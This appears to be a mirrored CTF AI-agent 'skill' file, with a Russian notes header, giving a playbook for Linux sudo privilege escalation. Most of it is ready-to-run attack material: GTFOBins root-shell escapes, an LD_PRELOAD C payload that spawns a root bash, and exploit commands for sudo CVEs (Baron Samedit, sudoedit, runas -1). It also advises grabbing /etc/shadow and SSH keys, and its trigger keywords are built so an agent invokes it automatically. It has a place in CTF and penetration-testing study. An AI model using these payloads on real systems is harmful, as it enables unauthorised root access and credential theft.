# Sudo Privilege Escalation (GTFOBins + CVEs)

[Оглавление](https://raw.githubusercontent.com/BigBread57/zametki/main/INDEX.md) · [Происхождение и ограничения](https://raw.githubusercontent.com/BigBread57/zametki/main/SOURCES.md)

> Справочный документ. Инструкции и примеры ниже принадлежат источнику; они не подтверждают состояние вашей системы и не запускаются автоматически. Чтение этого файла не устанавливает скил, инструменты или MCP.

Источники этого текста:

- [Salman0x01/ctf-ai-agent-skills / instructions/host-linux/sudo-gtfobins.md](https://github.com/Salman0x01/ctf-ai-agent-skills/blob/0e91c90a7125c6591a56f51276275905f2dfb017/instructions/host-linux/sudo-gtfobins.md)

---

---
name: sudo-gtfobins
category: host-linux
triggers: ["sudo -l", "NOPASSWD", "GTFOBins", "sudo allowed command", "env_keep", "LD_PRELOAD", "Baron Samedit", "sudoedit", "sudo version"]
tools: ["sudo", "GTFOBins", "gcc", "searchsploit"]
priority: high
description: Turn sudo -l output into a root shell via GTFOBins escapes, env/LD_PRELOAD abuse, or a sudo CVE.
---
# Sudo Privilege Escalation (GTFOBins + CVEs)

## Trigger context
`sudo -l` lists one or more commands the current user may run as root (often `NOPASSWD:`), OR a vulnerable `sudo` version is installed. This is one of the highest-yield Linux privesc vectors.

## Objective
Escalate from the current user to root (or another target user) by abusing a permitted sudo command, a preserved environment variable, or a sudo binary vulnerability.

## Methodology (decision tree)
1. Run `sudo -l`. Read it carefully for: the runas user `(root)` / `(ALL)`, `NOPASSWD`, the exact command path, wildcards, and the `env_keep` / `env_reset` / `SETENV` flags in the `Defaults` line.
2. For each allowed binary -> look it up on GTFOBins under the **Sudo** function. If it has an entry, use that escape.
3. No GTFOBins entry, but `env_keep+=LD_PRELOAD` / `LD_LIBRARY_PATH` is set -> use the LD_PRELOAD shared-object trick.
4. Command runs a script/binary you can write to, or calls sub-binaries by relative name -> PATH / wildcard / script-content abuse.
5. Nothing exploitable in the rules -> check the sudo VERSION (`sudo --version`) against known CVEs (Baron Samedit, sudoedit, sudo<1.8.28 runas `-u#-1`).

## Commands & payloads
```bash
sudo -l                      # enumerate
sudo --version | head -1     # version for CVE matching

# --- Direct GTFOBins Sudo escapes (run the allowed binary AS root) ---
sudo find . -exec /bin/sh \; -quit          # find
sudo vim -c ':!/bin/sh'                       # vim  (or :shell)
sudo less /etc/profile        # then type: !/bin/sh
sudo awk 'BEGIN {system("/bin/sh")}'          # awk
sudo env /bin/sh                              # env
sudo python3 -c 'import os; os.system("/bin/sh")'   # python
sudo perl -e 'exec "/bin/sh";'                # perl
sudo nmap --interactive       # (old nmap) then: !sh
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh   # tar
sudo man man                  # then: !/bin/sh
sudo apt-get changelog apt    # then: !/bin/sh   (also apt update -o APT::Update::Pre-Invoke...)
# Read-only sudo (e.g. sudo cat/less arbitrary file): read /etc/shadow, then crack.

# --- Wildcard / no-argument-restriction: run any command ---
sudo /usr/bin/something *      # if * is unquoted you may inject args/paths

# --- LD_PRELOAD (needs env_keep+=LD_PRELOAD, and a sudo-runnable binary) ---
cat > /tmp/x.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void _init(){ unsetenv("LD_PRELOAD"); setgid(0); setuid(0); system("/bin/bash -p"); }
EOF
gcc -fPIC -shared -o /tmp/x.so /tmp/x.c -nostartfiles
sudo LD_PRELOAD=/tmp/x.so <any-allowed-binary>   # e.g. sudo LD_PRELOAD=/tmp/x.so apache2

# --- LD_LIBRARY_PATH variant (env_keep+=LD_LIBRARY_PATH) ---
# Compile a .so exporting a function the allowed binary loads; place dir first in LD_LIBRARY_PATH.

# --- Baron Samedit  CVE-2021-3156 (sudo 1.8.2-1.8.31p2, 1.9.0-1.9.5p1) ---
sudoedit -s '\' $(python3 -c 'print("A"*1000)')   # crash => vulnerable; use public exploit for shell
# git clone https://github.com/blasty/CVE-2021-3156 ; make ; ./sudo-hax-me-a-sandwich

# --- sudoedit arbitrary file  CVE-2023-22809 (sudo 1.8.0-1.9.12p1) ---
# If sudo -l allows sudoedit on some file:
EDITOR='vim -- /etc/sudoers' sudoedit /path/allowed/file   # edit a file NOT in the rule

# --- runas -1 bypass  CVE-2019-14287 (sudo < 1.8.28), rule like (ALL, !root) ---
sudo -u#-1 /bin/bash        # -1/4294967295 maps to root
```

## Branching logic
- `(root) NOPASSWD: <binary>` + GTFOBins Sudo entry -> instant shell, no password needed.
- Password required and unknown -> pivot to LD_PRELOAD only if `env_keep` allows it, else target a sudo CVE (no password needed for Baron Samedit / PwnKit-style bugs).
- Allowed command is a script you can edit -> just put `/bin/bash -p` inside it and run via sudo.
- Allowed command calls another binary by name (no absolute path) and `secure_path` is absent -> PATH hijack: prepend a writable dir with your fake binary.
- Runas is a non-root user -> escalate laterally first, then re-enumerate that user's `sudo -l`.
- Read-only primitive (cat/head/less on any file) -> exfil `/etc/shadow`, SSH keys, or root-owned config with creds instead of a direct shell.

## Common pitfalls
- `secure_path` in Defaults neutralises PATH hijacking for sudo — check the Defaults line before betting on it.
- Missing `-p` on the spawned bash drops privileges back (bash resets euid without `-p`).
- LD_PRELOAD does nothing unless `env_keep` actually preserves it; `env_reset` (the default) strips it.
- GTFOBins Sudo and SUID payloads differ — the SUID ones add `-p`; don't cross them up.
- Version-string CVE matching is necessary but not sufficient; distros backport patches. Confirm with a crash test or a proof exploit, and check the OS package version too.
- Wildcards in the sudoers rule may be more restrictive than they look; test argument injection carefully.

## Proof / verification
- Success = `id` shows `uid=0(root)` (or the target uid) in the spawned shell.
- For CVEs, a crash/hang on the probe indicates vulnerability; only claim exploitation after you get a uid=0 shell.
- Grab `/etc/shadow` or write to a root-only file as independent proof.

## Cross-references
- [sa--instructions--host-linux--suid-sgid.md](https://raw.githubusercontent.com/BigBread57/zametki/main/03-linux/sa--instructions--host-linux--suid-sgid.md) — the same GTFOBins binaries, SUID variant (`-p`).
- [sa--instructions--host-linux--cron-path-hijack.md](https://raw.githubusercontent.com/BigBread57/zametki/main/03-linux/sa--instructions--host-linux--cron-path-hijack.md) — PATH hijack mechanics reused when `secure_path` is absent.
- [sa--instructions--host-linux--kernel-and-misc-privesc.md](https://raw.githubusercontent.com/BigBread57/zametki/main/03-linux/sa--instructions--host-linux--kernel-and-misc-privesc.md) — PwnKit (pkexec) and other setuid-helper CVEs.
- [sa--instructions--host-linux--linux-enum-linpeas.md](https://raw.githubusercontent.com/BigBread57/zametki/main/03-linux/sa--instructions--host-linux--linux-enum-linpeas.md) — where the `sudo -l` finding comes from.

## Credible sources
- GTFOBins (Sudo function): https://gtfobins.github.io/
- HackTricks sudo/GTFOBins abuse: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html
- CVE-2021-3156 Baron Samedit (Qualys): https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
- CVE-2023-22809 sudoedit: https://nvd.nist.gov/vuln/detail/CVE-2023-22809
- CVE-2019-14287 runas -1: https://nvd.nist.gov/vuln/detail/CVE-2019-14287
